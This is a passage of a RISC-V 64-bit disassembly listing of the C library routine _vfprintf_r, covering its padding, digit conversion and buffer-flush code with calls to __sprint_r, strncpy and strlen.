   1158c:	44c6c763          	blt	a3,a2,119da <_vfprintf_r+0x1092>
   11590:	7742                	ld	a4,48(sp)
   11592:	020c0693          	addi	a3,s8,32
   11596:	8c1a                	mv	s8,t1
   11598:	0027061b          	addiw	a2,a4,2
   1159c:	8336                	mv	t1,a3
   1159e:	668a                	ld	a3,128(sp)
   115a0:	1998                	addi	a4,sp,240
   115a2:	00ec3023          	sd	a4,0(s8)
   115a6:	00dd87b3          	add	a5,s11,a3
   115aa:	00dc3423          	sd	a3,8(s8)
   115ae:	f23e                	sd	a5,288(sp)
   115b0:	10c12c23          	sw	a2,280(sp)
   115b4:	471d                	li	a4,7
   115b6:	dec75963          	bge	a4,a2,10ba8 <_vfprintf_r+0x260>
   115ba:	bc2d                	j	10ff4 <_vfprintf_r+0x6ac>
   115bc:	4705                	li	a4,1
   115be:	8826                	mv	a6,s1
   115c0:	aae790e3          	bne	a5,a4,11060 <_vfprintf_r+0x718>
   115c4:	47a5                	li	a5,9
   115c6:	3737e163          	bltu	a5,s3,11928 <_vfprintf_r+0xfe0>
   115ca:	0309899b          	addiw	s3,s3,48
   115ce:	193105a3          	sb	s3,395(sp)
   115d2:	84c2                	mv	s1,a6
   115d4:	4c05                	li	s8,1
   115d6:	18b10c93          	addi	s9,sp,395
   115da:	ed6ff06f          	j	10cb0 <_vfprintf_r+0x368>
   115de:	11812703          	lw	a4,280(sp)
   115e2:	0000b897          	auipc	a7,0xb
   115e6:	2be88893          	addi	a7,a7,702 # 1c8a0 <blanks.4520>
   115ea:	439d                	li	t2,7
   115ec:	00dd4663          	blt	s10,a3,115f8 <_vfprintf_r+0xcb0>
   115f0:	a889                	j	11642 <_vfprintf_r+0xcfa>
   115f2:	36c1                	addiw	a3,a3,-16
   115f4:	04dd5763          	bge	s10,a3,11642 <_vfprintf_r+0xcfa>
   115f8:	2705                	addiw	a4,a4,1
   115fa:	07c1                	addi	a5,a5,16
   115fc:	01133023          	sd	a7,0(t1)
   11600:	01a33423          	sd	s10,8(t1)
   11604:	f23e                	sd	a5,288(sp)
   11606:	10e12c23          	sw	a4,280(sp)
   1160a:	0341                	addi	t1,t1,16
   1160c:	fee3d3e3          	bge	t2,a4,115f2 <_vfprintf_r+0xcaa>
   11610:	0a10                	addi	a2,sp,272
   11612:	85d2                	mv	a1,s4
   11614:	8556                	mv	a0,s5
   11616:	e4c6                	sd	a7,72(sp)
   11618:	e0f6                	sd	t4,64(sp)
   1161a:	fc7e                	sd	t6,56(sp)
   1161c:	f816                	sd	t0,48(sp)
   1161e:	e436                	sd	a3,8(sp)
   11620:	0e7070ef          	jal	ra,18f06 <__sprint_r>
   11624:	ec0512e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11628:	66a2                	ld	a3,8(sp)
   1162a:	7792                	ld	a5,288(sp)
   1162c:	11812703          	lw	a4,280(sp)
   11630:	36c1                	addiw	a3,a3,-16
   11632:	68a6                	ld	a7,72(sp)
   11634:	6e86                	ld	t4,64(sp)
   11636:	7fe2                	ld	t6,56(sp)
   11638:	72c2                	ld	t0,48(sp)
   1163a:	835e                	mv	t1,s7
   1163c:	439d                	li	t2,7
   1163e:	fadd4de3          	blt	s10,a3,115f8 <_vfprintf_r+0xcb0>
   11642:	2705                	addiw	a4,a4,1
   11644:	97b6                	add	a5,a5,a3
   11646:	00d33423          	sd	a3,8(t1)
   1164a:	01133023          	sd	a7,0(t1)
   1164e:	0007069b          	sext.w	a3,a4
   11652:	10e12c23          	sw	a4,280(sp)
   11656:	f23e                	sd	a5,288(sp)
   11658:	471d                	li	a4,7
   1165a:	0341                	addi	t1,t1,16
   1165c:	cad75d63          	bge	a4,a3,10b16 <_vfprintf_r+0x1ce>
   11660:	0a10                	addi	a2,sp,272
   11662:	85d2                	mv	a1,s4
   11664:	8556                	mv	a0,s5
   11666:	fc76                	sd	t4,56(sp)
   11668:	f87e                	sd	t6,48(sp)
   1166a:	e416                	sd	t0,8(sp)
   1166c:	09b070ef          	jal	ra,18f06 <__sprint_r>
   11670:	e6051ce3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11674:	7792                	ld	a5,288(sp)
   11676:	7ee2                	ld	t4,56(sp)
   11678:	7fc2                	ld	t6,48(sp)
   1167a:	62a2                	ld	t0,8(sp)
   1167c:	835e                	mv	t1,s7
   1167e:	c98ff06f          	j	10b16 <_vfprintf_r+0x1ce>
   11682:	0a10                	addi	a2,sp,272
   11684:	85d2                	mv	a1,s4
   11686:	8556                	mv	a0,s5
   11688:	f876                	sd	t4,48(sp)
   1168a:	e47e                	sd	t6,8(sp)
   1168c:	07b070ef          	jal	ra,18f06 <__sprint_r>
   11690:	e4051ce3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11694:	7792                	ld	a5,288(sp)
   11696:	7ec2                	ld	t4,48(sp)
   11698:	6fa2                	ld	t6,8(sp)
   1169a:	835e                	mv	t1,s7
   1169c:	cd2ff06f          	j	10b6e <_vfprintf_r+0x226>
   116a0:	11812703          	lw	a4,280(sp)
   116a4:	0000b897          	auipc	a7,0xb
   116a8:	1fc88893          	addi	a7,a7,508 # 1c8a0 <blanks.4520>
   116ac:	4c1d                	li	s8,7
   116ae:	009d4663          	blt	s10,s1,116ba <_vfprintf_r+0xd72>
   116b2:	a081                	j	116f2 <_vfprintf_r+0xdaa>
   116b4:	34c1                	addiw	s1,s1,-16
   116b6:	029d5e63          	bge	s10,s1,116f2 <_vfprintf_r+0xdaa>
   116ba:	2705                	addiw	a4,a4,1
   116bc:	07c1                	addi	a5,a5,16
   116be:	01133023          	sd	a7,0(t1)
   116c2:	01a33423          	sd	s10,8(t1)
   116c6:	f23e                	sd	a5,288(sp)
   116c8:	10e12c23          	sw	a4,280(sp)
   116cc:	0341                	addi	t1,t1,16
   116ce:	feec53e3          	bge	s8,a4,116b4 <_vfprintf_r+0xd6c>
   116d2:	0a10                	addi	a2,sp,272
   116d4:	85d2                	mv	a1,s4
   116d6:	8556                	mv	a0,s5
   116d8:	e446                	sd	a7,8(sp)
   116da:	02d070ef          	jal	ra,18f06 <__sprint_r>
   116de:	e00515e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   116e2:	34c1                	addiw	s1,s1,-16
   116e4:	7792                	ld	a5,288(sp)
   116e6:	11812703          	lw	a4,280(sp)
   116ea:	68a2                	ld	a7,8(sp)
   116ec:	835e                	mv	t1,s7
   116ee:	fc9d46e3          	blt	s10,s1,116ba <_vfprintf_r+0xd72>
   116f2:	0017069b          	addiw	a3,a4,1
   116f6:	97a6                	add	a5,a5,s1
   116f8:	01133023          	sd	a7,0(t1)
   116fc:	00933423          	sd	s1,8(t1)
   11700:	f23e                	sd	a5,288(sp)
   11702:	10d12c23          	sw	a3,280(sp)
   11706:	471d                	li	a4,7
   11708:	cad75663          	bge	a4,a3,10bb4 <_vfprintf_r+0x26c>
   1170c:	0a10                	addi	a2,sp,272
   1170e:	85d2                	mv	a1,s4
   11710:	8556                	mv	a0,s5
   11712:	7f4070ef          	jal	ra,18f06 <__sprint_r>
   11716:	dc0519e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   1171a:	7792                	ld	a5,288(sp)
   1171c:	c98ff06f          	j	10bb4 <_vfprintf_r+0x26c>
   11720:	562e                	lw	a2,232(sp)
   11722:	3ec05e63          	blez	a2,11b1e <_vfprintf_r+0x11d6>
   11726:	6766                	ld	a4,88(sp)
   11728:	7682                	ld	a3,32(sp)
   1172a:	00070c1b          	sext.w	s8,a4
   1172e:	28e6c263          	blt	a3,a4,119b2 <_vfprintf_r+0x106a>
   11732:	03805263          	blez	s8,11756 <_vfprintf_r+0xe0e>
   11736:	11812703          	lw	a4,280(sp)
   1173a:	97e2                	add	a5,a5,s8
   1173c:	01933023          	sd	s9,0(t1)
   11740:	0017069b          	addiw	a3,a4,1
   11744:	01833423          	sd	s8,8(t1)
   11748:	f23e                	sd	a5,288(sp)
   1174a:	10d12c23          	sw	a3,280(sp)
   1174e:	471d                	li	a4,7
   11750:	0341                	addi	t1,t1,16
   11752:	6ed74d63          	blt	a4,a3,11e4c <_vfprintf_r+0x1504>
   11756:	fffc4713          	not	a4,s8
   1175a:	977d                	srai	a4,a4,0x3f
   1175c:	00ec7c33          	and	s8,s8,a4
   11760:	6766                	ld	a4,88(sp)
   11762:	41870c3b          	subw	s8,a4,s8
   11766:	33804c63          	bgtz	s8,11a9e <_vfprintf_r+0x1156>
   1176a:	66e6                	ld	a3,88(sp)
   1176c:	4004f713          	andi	a4,s1,1024
   11770:	00dc8db3          	add	s11,s9,a3
   11774:	54071f63          	bnez	a4,11cd2 <_vfprintf_r+0x138a>
   11778:	572e                	lw	a4,232(sp)
   1177a:	7682                	ld	a3,32(sp)
   1177c:	00d74663          	blt	a4,a3,11788 <_vfprintf_r+0xe40>
   11780:	0014f693          	andi	a3,s1,1
   11784:	6e068063          	beqz	a3,11e64 <_vfprintf_r+0x151c>
   11788:	76e6                	ld	a3,120(sp)
   1178a:	7646                	ld	a2,112(sp)
   1178c:	0341                	addi	t1,t1,16
   1178e:	fed33823          	sd	a3,-16(t1)
   11792:	11812683          	lw	a3,280(sp)
   11796:	97b2                	add	a5,a5,a2
   11798:	fec33c23          	sd	a2,-8(t1)
   1179c:	2685                	addiw	a3,a3,1
   1179e:	0006861b          	sext.w	a2,a3
   117a2:	10d12c23          	sw	a3,280(sp)
   117a6:	f23e                	sd	a5,288(sp)
   117a8:	469d                	li	a3,7
   117aa:	22c6c7e3          	blt	a3,a2,121d8 <_vfprintf_r+0x1890>
   117ae:	7682                	ld	a3,32(sp)
   117b0:	00dc8633          	add	a2,s9,a3
   117b4:	40e6873b          	subw	a4,a3,a4
   117b8:	41b6063b          	subw	a2,a2,s11
   117bc:	0007069b          	sext.w	a3,a4
   117c0:	00d65363          	bge	a2,a3,117c6 <_vfprintf_r+0xe7e>
   117c4:	8732                	mv	a4,a2
   117c6:	00070c9b          	sext.w	s9,a4
   117ca:	03905263          	blez	s9,117ee <_vfprintf_r+0xea6>
   117ce:	11812603          	lw	a2,280(sp)
   117d2:	97e6                	add	a5,a5,s9
   117d4:	01b33023          	sd	s11,0(t1)
   117d8:	0016059b          	addiw	a1,a2,1
   117dc:	01933423          	sd	s9,8(t1)
   117e0:	f23e                	sd	a5,288(sp)
   117e2:	10b12c23          	sw	a1,280(sp)
   117e6:	461d                	li	a2,7
   117e8:	0341                	addi	t1,t1,16
   117ea:	26b644e3          	blt	a2,a1,12252 <_vfprintf_r+0x190a>
   117ee:	fffccc13          	not	s8,s9
   117f2:	43fc5c13          	srai	s8,s8,0x3f
   117f6:	018cfc33          	and	s8,s9,s8
   117fa:	41868c3b          	subw	s8,a3,s8
   117fe:	bb805563          	blez	s8,10ba8 <_vfprintf_r+0x260>
   11802:	11812703          	lw	a4,280(sp)
   11806:	3b8d5563          	bge	s10,s8,11bb0 <_vfprintf_r+0x1268>
   1180a:	4c9d                	li	s9,7
   1180c:	a021                	j	11814 <_vfprintf_r+0xecc>
   1180e:	3c41                	addiw	s8,s8,-16
   11810:	3b8d5063          	bge	s10,s8,11bb0 <_vfprintf_r+0x1268>
   11814:	2705                	addiw	a4,a4,1
   11816:	07c1                	addi	a5,a5,16
   11818:	01233023          	sd	s2,0(t1)
   1181c:	01a33423          	sd	s10,8(t1)
   11820:	f23e                	sd	a5,288(sp)
   11822:	10e12c23          	sw	a4,280(sp)
   11826:	0341                	addi	t1,t1,16
   11828:	feecd3e3          	bge	s9,a4,1180e <_vfprintf_r+0xec6>
   1182c:	0a10                	addi	a2,sp,272
   1182e:	85d2                	mv	a1,s4
   11830:	8556                	mv	a0,s5
   11832:	6d4070ef          	jal	ra,18f06 <__sprint_r>
   11836:	ca0519e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   1183a:	7792                	ld	a5,288(sp)
   1183c:	11812703          	lw	a4,280(sp)
   11840:	835e                	mv	t1,s7
   11842:	b7f1                	j	1180e <_vfprintf_r+0xec6>
   11844:	0014f513          	andi	a0,s1,1
   11848:	cc0518e3          	bnez	a0,11518 <_vfprintf_r+0xbd0>
   1184c:	00b33423          	sd	a1,8(t1)
   11850:	f26e                	sd	s11,288(sp)
   11852:	10e12c23          	sw	a4,280(sp)
   11856:	469d                	li	a3,7
   11858:	18e6c163          	blt	a3,a4,119da <_vfprintf_r+0x1092>
   1185c:	2609                	addiw	a2,a2,2
   1185e:	02030313          	addi	t1,t1,32
   11862:	bb35                	j	1159e <_vfprintf_r+0xc56>
   11864:	d2d05de3          	blez	a3,1159e <_vfprintf_r+0xc56>
   11868:	4cdd50e3          	bge	s10,a3,12528 <_vfprintf_r+0x1be0>
   1186c:	4c9d                	li	s9,7
   1186e:	a031                	j	1187a <_vfprintf_r+0xf32>
   11870:	36c1                	addiw	a3,a3,-16
   11872:	14dd5563          	bge	s10,a3,119bc <_vfprintf_r+0x1074>
   11876:	0017089b          	addiw	a7,a4,1
   1187a:	0dc1                	addi	s11,s11,16
   1187c:	012c3023          	sd	s2,0(s8)
   11880:	01ac3423          	sd	s10,8(s8)
   11884:	f26e                	sd	s11,288(sp)
   11886:	0008871b          	sext.w	a4,a7
   1188a:	11112c23          	sw	a7,280(sp)
   1188e:	0c41                	addi	s8,s8,16
   11890:	feecd0e3          	bge	s9,a4,11870 <_vfprintf_r+0xf28>
   11894:	0a10                	addi	a2,sp,272
   11896:	85d2                	mv	a1,s4
   11898:	8556                	mv	a0,s5
   1189a:	e436                	sd	a3,8(sp)
   1189c:	66a070ef          	jal	ra,18f06 <__sprint_r>
   118a0:	c40514e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   118a4:	7d92                	ld	s11,288(sp)
   118a6:	11812703          	lw	a4,280(sp)
   118aa:	66a2                	ld	a3,8(sp)
   118ac:	8c5e                	mv	s8,s7
   118ae:	b7c9                	j	11870 <_vfprintf_r+0xf28>
   118b0:	01087793          	andi	a5,a6,16
   118b4:	eb8d                	bnez	a5,118e6 <_vfprintf_r+0xf9e>
   118b6:	66c2                	ld	a3,16(sp)
   118b8:	04087793          	andi	a5,a6,64
   118bc:	0006a983          	lw	s3,0(a3)
   118c0:	36078c63          	beqz	a5,11c38 <_vfprintf_r+0x12f0>
   118c4:	19c2                	slli	s3,s3,0x30
   118c6:	0309d993          	srli	s3,s3,0x30
   118ca:	e83a                	sd	a4,16(sp)
   118cc:	4785                	li	a5,1
   118ce:	c26ff06f          	j	10cf4 <_vfprintf_r+0x3ac>
   118d2:	0014f713          	andi	a4,s1,1
   118d6:	ac070963          	beqz	a4,10ba8 <_vfprintf_r+0x260>
   118da:	b461                	j	11362 <_vfprintf_r+0xa1a>
   118dc:	6782                	ld	a5,0(sp)
   118de:	8ca2                	mv	s9,s0
   118e0:	e31c                	sd	a5,0(a4)
   118e2:	af8ff06f          	j	10bda <_vfprintf_r+0x292>
   118e6:	67c2                	ld	a5,16(sp)
   118e8:	e83a                	sd	a4,16(sp)
   118ea:	0007b983          	ld	s3,0(a5)
   118ee:	4785                	li	a5,1
   118f0:	c04ff06f          	j	10cf4 <_vfprintf_r+0x3ac>
   118f4:	67c2                	ld	a5,16(sp)
   118f6:	639c                	ld	a5,0(a5)
   118f8:	89be                	mv	s3,a5
   118fa:	b90ff06f          	j	10c8a <_vfprintf_r+0x342>
   118fe:	67c2                	ld	a5,16(sp)
   11900:	0007b983          	ld	s3,0(a5)
   11904:	be4ff06f          	j	10ce8 <_vfprintf_r+0x3a0>
   11908:	67c2                	ld	a5,16(sp)
   1190a:	07bd                	addi	a5,a5,15
   1190c:	9bc1                	andi	a5,a5,-16
   1190e:	6394                	ld	a3,0(a5)
   11910:	6798                	ld	a4,8(a5)
   11912:	07c1                	addi	a5,a5,16
   11914:	e83e                	sd	a5,16(sp)
   11916:	e236                	sd	a3,256(sp)
   11918:	e63a                	sd	a4,264(sp)
   1191a:	c50ff06f          	j	10d6a <_vfprintf_r+0x422>
   1191e:	e83a                	sd	a4,16(sp)
   11920:	47a5                	li	a5,9
   11922:	8826                	mv	a6,s1
   11924:	cb37f3e3          	bgeu	a5,s3,115ca <_vfprintf_r+0xc82>
   11928:	40087793          	andi	a5,a6,1024
   1192c:	18c10c13          	addi	s8,sp,396
   11930:	2781                	sext.w	a5,a5
   11932:	f002                	sd	zero,32(sp)
   11934:	85e2                	mv	a1,s8
   11936:	44a9                	li	s1,10
   11938:	4725                	li	a4,9
   1193a:	0ff00693          	li	a3,255
   1193e:	a039                	j	1194c <_vfprintf_r+0x1004>
   11940:	0299d633          	divu	a2,s3,s1
   11944:	9d3771e3          	bgeu	a4,s3,11306 <_vfprintf_r+0x9be>
   11948:	89b2                	mv	s3,a2
   1194a:	85e6                	mv	a1,s9
   1194c:	7502                	ld	a0,32(sp)
   1194e:	fff58c93          	addi	s9,a1,-1
   11952:	2505                	addiw	a0,a0,1
   11954:	f02a                	sd	a0,32(sp)
   11956:	0299f633          	remu	a2,s3,s1
   1195a:	0306061b          	addiw	a2,a2,48
   1195e:	fec58fa3          	sb	a2,-1(a1)
   11962:	dff9                	beqz	a5,11940 <_vfprintf_r+0xff8>
   11964:	7626                	ld	a2,104(sp)
   11966:	00064603          	lbu	a2,0(a2)
   1196a:	fcc51be3          	bne	a0,a2,11940 <_vfprintf_r+0xff8>
   1196e:	fcd609e3          	beq	a2,a3,11940 <_vfprintf_r+0xff8>
   11972:	99377ae3          	bgeu	a4,s3,11306 <_vfprintf_r+0x9be>
   11976:	fc3e                	sd	a5,56(sp)
   11978:	67aa                	ld	a5,136(sp)
   1197a:	65ca                	ld	a1,144(sp)
   1197c:	f81a                	sd	t1,48(sp)
   1197e:	40fc8cb3          	sub	s9,s9,a5
   11982:	863e                	mv	a2,a5
   11984:	8566                	mv	a0,s9
   11986:	ec76                	sd	t4,24(sp)
   11988:	e442                	sd	a6,8(sp)
   1198a:	07b050ef          	jal	ra,17204 <strncpy>
   1198e:	77a6                	ld	a5,104(sp)
   11990:	0299d633          	divu	a2,s3,s1
   11994:	6822                	ld	a6,8(sp)
   11996:	0017c583          	lbu	a1,1(a5)
   1199a:	6ee2                	ld	t4,24(sp)
   1199c:	7342                	ld	t1,48(sp)
   1199e:	00b035b3          	snez	a1,a1
   119a2:	97ae                	add	a5,a5,a1
   119a4:	f4be                	sd	a5,104(sp)
   119a6:	f002                	sd	zero,32(sp)
   119a8:	77e2                	ld	a5,56(sp)
   119aa:	4725                	li	a4,9
   119ac:	0ff00693          	li	a3,255
   119b0:	bf61                	j	11948 <_vfprintf_r+0x1000>
   119b2:	00068c1b          	sext.w	s8,a3
   119b6:	d98040e3          	bgtz	s8,11736 <_vfprintf_r+0xdee>
   119ba:	bb71                	j	11756 <_vfprintf_r+0xe0e>
   119bc:	0017061b          	addiw	a2,a4,1
   119c0:	010c0713          	addi	a4,s8,16
   119c4:	9db6                	add	s11,s11,a3
   119c6:	00dc3423          	sd	a3,8(s8)
   119ca:	012c3023          	sd	s2,0(s8)
   119ce:	f26e                	sd	s11,288(sp)
   119d0:	10c12c23          	sw	a2,280(sp)
   119d4:	469d                	li	a3,7
   119d6:	44c6d563          	bge	a3,a2,11e20 <_vfprintf_r+0x14d8>
   119da:	0a10                	addi	a2,sp,272
   119dc:	85d2                	mv	a1,s4
   119de:	8556                	mv	a0,s5
   119e0:	526070ef          	jal	ra,18f06 <__sprint_r>
   119e4:	b00512e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   119e8:	11812603          	lw	a2,280(sp)
   119ec:	7d92                	ld	s11,288(sp)
   119ee:	1a010313          	addi	t1,sp,416
   119f2:	2605                	addiw	a2,a2,1
   119f4:	8c5e                	mv	s8,s7
   119f6:	b665                	j	1159e <_vfprintf_r+0xc56>
   119f8:	8826                	mv	a6,s1
   119fa:	825ff06f          	j	1121e <_vfprintf_r+0x8d6>
   119fe:	0000b797          	auipc	a5,0xb
   11a02:	d0a78793          	addi	a5,a5,-758 # 1c708 <__clzdi2+0x1b4>
   11a06:	f43e                	sd	a5,40(sp)
   11a08:	66c2                	ld	a3,16(sp)
   11a0a:	0204f793          	andi	a5,s1,32
   11a0e:	00868713          	addi	a4,a3,8
   11a12:	c7f9                	beqz	a5,11ae0 <_vfprintf_r+0x1198>
   11a14:	0006b983          	ld	s3,0(a3)
   11a18:	0014f793          	andi	a5,s1,1
   11a1c:	cf81                	beqz	a5,11a34 <_vfprintf_r+0x10ec>
   11a1e:	00098b63          	beqz	s3,11a34 <_vfprintf_r+0x10ec>
   11a22:	0024e493          	ori	s1,s1,2
   11a26:	03000793          	li	a5,48
   11a2a:	0ef10023          	sb	a5,224(sp)
   11a2e:	0fb100a3          	sb	s11,225(sp)
   11a32:	2481                	sext.w	s1,s1
   11a34:	bff4f493          	andi	s1,s1,-1025
   11a38:	0004881b          	sext.w	a6,s1
   11a3c:	e83a                	sd	a4,16(sp)
   11a3e:	4789                	li	a5,2
   11a40:	ab4ff06f          	j	10cf4 <_vfprintf_r+0x3ac>
   11a44:	2004e493          	ori	s1,s1,512
   11a48:	00144f03          	lbu	t5,1(s0)
   11a4c:	2481                	sext.w	s1,s1
   11a4e:	0405                	addi	s0,s0,1
   11a50:	82cff06f          	j	10a7c <_vfprintf_r+0x134>
   11a54:	0204e493          	ori	s1,s1,32
   11a58:	00144f03          	lbu	t5,1(s0)
   11a5c:	2481                	sext.w	s1,s1
   11a5e:	0405                	addi	s0,s0,1
   11a60:	81cff06f          	j	10a7c <_vfprintf_r+0x134>
   11a64:	0a10                	addi	a2,sp,272
   11a66:	85d2                	mv	a1,s4
   11a68:	8556                	mv	a0,s5
   11a6a:	49c070ef          	jal	ra,18f06 <__sprint_r>
   11a6e:	a6051de3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11a72:	7792                	ld	a5,288(sp)
   11a74:	835e                	mv	t1,s7
   11a76:	ba09                	j	11388 <_vfprintf_r+0xa40>
   11a78:	0000b797          	auipc	a5,0xb
   11a7c:	c7878793          	addi	a5,a5,-904 # 1c6f0 <__clzdi2+0x19c>
   11a80:	f43e                	sd	a5,40(sp)
   11a82:	b759                	j	11a08 <_vfprintf_r+0x10c0>
   11a84:	4799                	li	a5,6
   11a86:	000e8c1b          	sext.w	s8,t4
   11a8a:	3dd7eb63          	bltu	a5,t4,11e60 <_vfprintf_r+0x1518>
   11a8e:	89e2                	mv	s3,s8
   11a90:	e836                	sd	a3,16(sp)
   11a92:	0000bc97          	auipc	s9,0xb
   11a96:	c8ec8c93          	addi	s9,s9,-882 # 1c720 <__clzdi2+0x1cc>
   11a9a:	854ff06f          	j	10aee <_vfprintf_r+0x1a6>
   11a9e:	11812703          	lw	a4,280(sp)
   11aa2:	218d5063          	bge	s10,s8,11ca2 <_vfprintf_r+0x135a>
   11aa6:	4d9d                	li	s11,7
   11aa8:	a021                	j	11ab0 <_vfprintf_r+0x1168>
   11aaa:	3c41                	addiw	s8,s8,-16
   11aac:	1f8d5b63          	bge	s10,s8,11ca2 <_vfprintf_r+0x135a>
   11ab0:	2705                	addiw	a4,a4,1
   11ab2:	07c1                	addi	a5,a5,16
   11ab4:	01233023          	sd	s2,0(t1)
   11ab8:	01a33423          	sd	s10,8(t1)
   11abc:	f23e                	sd	a5,288(sp)
   11abe:	10e12c23          	sw	a4,280(sp)
   11ac2:	0341                	addi	t1,t1,16
   11ac4:	feedd3e3          	bge	s11,a4,11aaa <_vfprintf_r+0x1162>
   11ac8:	0a10                	addi	a2,sp,272
   11aca:	85d2                	mv	a1,s4
   11acc:	8556                	mv	a0,s5
   11ace:	438070ef          	jal	ra,18f06 <__sprint_r>
   11ad2:	a0051be3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11ad6:	7792                	ld	a5,288(sp)
   11ad8:	11812703          	lw	a4,280(sp)
   11adc:	835e                	mv	t1,s7
   11ade:	b7f1                	j	11aaa <_vfprintf_r+0x1162>
   11ae0:	0104f793          	andi	a5,s1,16
   11ae4:	c3cd                	beqz	a5,11b86 <_vfprintf_r+0x123e>
   11ae6:	67c2                	ld	a5,16(sp)
   11ae8:	0007b983          	ld	s3,0(a5)
   11aec:	b735                	j	11a18 <_vfprintf_r+0x10d0>
   11aee:	0a10                	addi	a2,sp,272
   11af0:	85d2                	mv	a1,s4
   11af2:	8556                	mv	a0,s5
   11af4:	412070ef          	jal	ra,18f06 <__sprint_r>
   11af8:	9e0518e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11afc:	7d92                	ld	s11,288(sp)
   11afe:	11812703          	lw	a4,280(sp)
   11b02:	8c5e                	mv	s8,s7
   11b04:	b41d                	j	1152a <_vfprintf_r+0xbe2>
   11b06:	0a10                	addi	a2,sp,272
   11b08:	85d2                	mv	a1,s4
   11b0a:	8556                	mv	a0,s5
   11b0c:	3fa070ef          	jal	ra,18f06 <__sprint_r>
   11b10:	9c051ce3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11b14:	7d92                	ld	s11,288(sp)
   11b16:	11812703          	lw	a4,280(sp)
   11b1a:	8c5e                	mv	s8,s7
   11b1c:	bc0d                	j	1154e <_vfprintf_r+0xc06>
   11b1e:	11812703          	lw	a4,280(sp)
   11b22:	0000b697          	auipc	a3,0xb
   11b26:	c0668693          	addi	a3,a3,-1018 # 1c728 <__clzdi2+0x1d4>
   11b2a:	00d33023          	sd	a3,0(t1)
   11b2e:	2705                	addiw	a4,a4,1
   11b30:	4685                	li	a3,1
   11b32:	0785                	addi	a5,a5,1
   11b34:	00d33423          	sd	a3,8(t1)
   11b38:	10e12c23          	sw	a4,280(sp)
   11b3c:	0007069b          	sext.w	a3,a4
   11b40:	f23e                	sd	a5,288(sp)
   11b42:	471d                	li	a4,7
   11b44:	0341                	addi	t1,t1,16
   11b46:	2ed74363          	blt	a4,a3,11e2c <_vfprintf_r+0x14e4>
   11b4a:	c4061363          	bnez	a2,10f90 <_vfprintf_r+0x648>
   11b4e:	7682                	ld	a3,32(sp)
   11b50:	0014f713          	andi	a4,s1,1
   11b54:	8f55                	or	a4,a4,a3
   11b56:	e319                	bnez	a4,11b5c <_vfprintf_r+0x1214>
   11b58:	850ff06f          	j	10ba8 <_vfprintf_r+0x260>
   11b5c:	76e6                	ld	a3,120(sp)
   11b5e:	7746                	ld	a4,112(sp)
   11b60:	00d33023          	sd	a3,0(t1)
   11b64:	11812683          	lw	a3,280(sp)
   11b68:	97ba                	add	a5,a5,a4
   11b6a:	00e33423          	sd	a4,8(t1)
   11b6e:	2685                	addiw	a3,a3,1
   11b70:	0006871b          	sext.w	a4,a3
   11b74:	10d12c23          	sw	a3,280(sp)
   11b78:	f23e                	sd	a5,288(sp)
   11b7a:	469d                	li	a3,7
   11b7c:	c2e6cd63          	blt	a3,a4,10fb6 <_vfprintf_r+0x66e>
   11b80:	0341                	addi	t1,t1,16
   11b82:	c54ff06f          	j	10fd6 <_vfprintf_r+0x68e>
   11b86:	66c2                	ld	a3,16(sp)
   11b88:	0404f793          	andi	a5,s1,64
   11b8c:	0006a983          	lw	s3,0(a3)
   11b90:	cbe1                	beqz	a5,11c60 <_vfprintf_r+0x1318>
   11b92:	19c2                	slli	s3,s3,0x30
   11b94:	0309d993          	srli	s3,s3,0x30
   11b98:	b541                	j	11a18 <_vfprintf_r+0x10d0>
   11b9a:	0a10                	addi	a2,sp,272
   11b9c:	85d2                	mv	a1,s4
   11b9e:	8556                	mv	a0,s5
   11ba0:	366070ef          	jal	ra,18f06 <__sprint_r>
   11ba4:	940512e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11ba8:	7792                	ld	a5,288(sp)
   11baa:	835e                	mv	t1,s7
   11bac:	faeff06f          	j	1135a <_vfprintf_r+0xa12>
   11bb0:	0017069b          	addiw	a3,a4,1
   11bb4:	8736                	mv	a4,a3
   11bb6:	97e2                	add	a5,a5,s8
   11bb8:	01233023          	sd	s2,0(t1)
   11bbc:	fdbfe06f          	j	10b96 <_vfprintf_r+0x24e>
   11bc0:	6512                	ld	a0,256(sp)
   11bc2:	65b2                	ld	a1,264(sp)
   11bc4:	4601                	li	a2,0
   11bc6:	4681                	li	a3,0
   11bc8:	e41a                	sd	t1,8(sp)
   11bca:	6f0090ef          	jal	ra,1b2ba <__letf2>
   11bce:	6322                	ld	t1,8(sp)
   11bd0:	54054763          	bltz	a0,1211e <_vfprintf_r+0x17d6>
   11bd4:	0df14783          	lbu	a5,223(sp)
   11bd8:	04700713          	li	a4,71
   11bdc:	0000bc97          	auipc	s9,0xb
   11be0:	af4c8c93          	addi	s9,s9,-1292 # 1c6d0 <__clzdi2+0x17c>
   11be4:	25b74f63          	blt	a4,s11,11e42 <_vfprintf_r+0x14fa>
   11be8:	f7f4f493          	andi	s1,s1,-129
   11bec:	ec02                	sd	zero,24(sp)
   11bee:	e882                	sd	zero,80(sp)
   11bf0:	f082                	sd	zero,96(sp)
   11bf2:	ec82                	sd	zero,88(sp)
   11bf4:	2481                	sext.w	s1,s1
   11bf6:	498d                	li	s3,3
   11bf8:	4c0d                	li	s8,3
   11bfa:	4e81                	li	t4,0
   11bfc:	8c079863          	bnez	a5,10ccc <_vfprintf_r+0x384>
   11c00:	ef9fe06f          	j	10af8 <_vfprintf_r+0x1b0>
   11c04:	8566                	mv	a0,s9
   11c06:	e41a                	sd	t1,8(sp)
   11c08:	e836                	sd	a3,16(sp)
   11c0a:	cabfe0ef          	jal	ra,108b4 <strlen>
   11c0e:	00050c1b          	sext.w	s8,a0
   11c12:	fffc4993          	not	s3,s8
   11c16:	0df14783          	lbu	a5,223(sp)
   11c1a:	43f9d993          	srai	s3,s3,0x3f
   11c1e:	013c79b3          	and	s3,s8,s3
   11c22:	ec02                	sd	zero,24(sp)
   11c24:	e882                	sd	zero,80(sp)
   11c26:	f082                	sd	zero,96(sp)
